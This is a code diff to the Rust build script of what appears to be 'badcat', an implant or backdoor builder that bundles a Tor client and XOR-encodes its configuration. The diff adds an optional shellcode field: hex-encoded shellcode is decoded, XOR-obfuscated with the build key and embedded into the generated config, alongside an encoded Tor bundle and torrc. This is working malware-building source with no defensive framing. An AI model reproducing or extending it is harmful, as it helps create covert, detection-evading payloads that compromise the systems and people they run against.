@@ -2,6 +2,7 @@ use std::{fs, error, collections, process};
 use std::path::{Path, PathBuf};
 
 use badcat_lib::{xor, http};
+use hex::FromHex;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
 const CFG_DESTINATION: &str = "src/config.rs";
@@ -14,7 +15,8 @@ struct BuildSetting {
     linux_url: String,
     linux_dir: String,
     torrc: String,
-    name: String
+    name: String,
+    shellcode: String
 }
 
 fn main() -> Result<(), Box<dyn error::Error>> {
@@ -59,6 +61,15 @@ ControlSocket @{CTRL_SOCKET}
     replacements.insert("@{ENC_TORRC}", enc_torrc);
 
     replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
+
+    let enc_shellcode = if &setting.shellcode == "" {
+        String::from("")
+    } else {
+        let bytes: Vec<u8> = Vec::from_hex(&setting.shellcode)?;
+        xor::encode_bytes(&setting.key, &bytes)
+    };
+
+    replacements.insert("@{ENC_SHELLCODE}", enc_shellcode);
 
     replace_settings(
         CFG_TEMPLATE,
@@ -194,16 +205,15 @@ fn replace_settings(
 }
 
 fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
-    let key;
-    if raw.has_key("key") {
-        key = String::from(
+    let key = if raw.has_key("key") {
+        String::from(
             raw["key"].as_str().unwrap_or_else(|| {
                 panic!("key must be a string");
             })
-        );
+        )
     } else {
-        key = xor::secret_key();
-    }
+        xor::secret_key()
+    };
 
     let windows_url = String::from(
         raw["tor_urls"]["windows"]
@@ -253,6 +263,14 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
             })
     );
 
+    let shellcode = String::from(
+        raw["shellcode"]
+            .as_str()
+            .unwrap_or_else(|| {
+                ""
+            })
+    );
+
     BuildSetting {
         is_tor_for_windows: cfg!(feature = "tor_for_windows"),
         key,
@@ -261,6 +279,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
         linux_url,
         linux_dir,
         torrc,
-        name
+        name,
+        shellcode,
     }
 }
